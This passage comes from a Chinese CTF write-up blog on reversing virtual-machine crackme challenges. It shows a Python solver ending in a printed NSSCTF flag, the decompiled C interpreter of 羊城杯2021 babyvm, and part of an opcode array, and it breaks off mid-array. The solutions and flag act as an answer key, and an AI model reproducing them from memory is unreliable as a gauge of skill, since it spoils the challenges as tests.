class="comment">#     last[now_num - 1] = or_not_num &amp; or_num</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now_num = 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     save = last[now_num]</span></span><br><span class="line"><span class="comment">#     now_num+=1</span></span><br><span class="line"><span class="comment">#     last[now_num-1] = now_num + save - 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]-=i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    last[i]^=last[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment">#NSSCTF&#123;H@ppy_Ch1ne5_NEwY3ar!1!1&#125;</span></span><br></pre></td></tr></table></figure><p>小结：这个题和之前遇到的jvm那道题一样，都要解析指令，还原流程</p><h2 id="羊城杯2021-babyvm">羊城杯2021 babyvm</h2><p>这个题一样，只是在前面加了一个动态调试</p><p>指令码大概是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_80487A8</span><span class="params">(_DWORD *reg)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"><span class="type">int</span> reg[<span class="number">999</span>];</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">113</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">6</span>] -= <span class="number">4</span>;</span><br><span class="line">      *(_DWORD *)reg[<span class="number">6</span>] = *(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">65</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] += reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] -= reg[<span class="number">4</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">67</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">56</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">57</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">53</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xF7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">68</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] /= reg[<span class="number">5</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[sub_804875F(reg, <span class="number">1</span>)] = *(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">2</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">119</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">83</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(*(<span class="type">char</span> *)reg[<span class="number">3</span>]);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">34</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0x99</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">118</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">3</span>] = *(_DWORD *)reg[<span class="number">6</span>];</span><br><span class="line">      *(_DWORD *)reg[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">      reg[<span class="number">6</span>] += <span class="number">4</span>;</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">84</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (_BYTE *)reg[<span class="number">3</span>];</span><br><span class="line">      *v1 = getchar();</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">48</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] |= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">3</span>] = *(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = <span class="number">1877735783</span>;</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">51</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">2</span>] = *(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xFE</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, reg[<span class="number">1</span>]);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( reg[<span class="number">1</span>] != <span class="number">1877735783</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, s, <span class="number">0x2C</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">44</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">0</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">1</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xA4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fog[*(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>)] = reg[<span class="number">1</span>];</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">2</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xB4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">9</span>] = fog[<span class="number">3</span>];</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg[<span class="number">1</span>] = (<span class="type">unsigned</span> __int8)s[*(<span class="type">unsigned</span> __int8 *)(reg[<span class="number">8</span>] + <span class="number">1</span>)];</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( exit_door[<span class="number">0</span>] != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( exit_door[<span class="number">1</span>] != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++reg[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)reg[<span class="number">8</span>] == <span class="number">0xC2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)*(_DWORD *)(reg[<span class="number">8</span>] + <span class="number">1</span>) != reg[<span class="number">1</span>] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      reg[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后转换写出来就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">flagafter = []</span><br><span class="line">fog = [<span class="number">0x0000007B</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000037</span>, <span class="number">0x000000E8</span>]</span><br><span class="line"></span><br><span class="line">exit_door = [<span class="number">0xCF1304DC</span>, <span class="number">0x283B8E84</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = [<span class="number">0xA1</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x02</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDD</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x03</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x04</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x06</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x08</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x09</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0A</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0C</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x8E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0D</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0E</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x10</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x11</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x13</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x14</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x15</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x16</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x52</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x17</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x18</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x19</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xD9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1A</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span 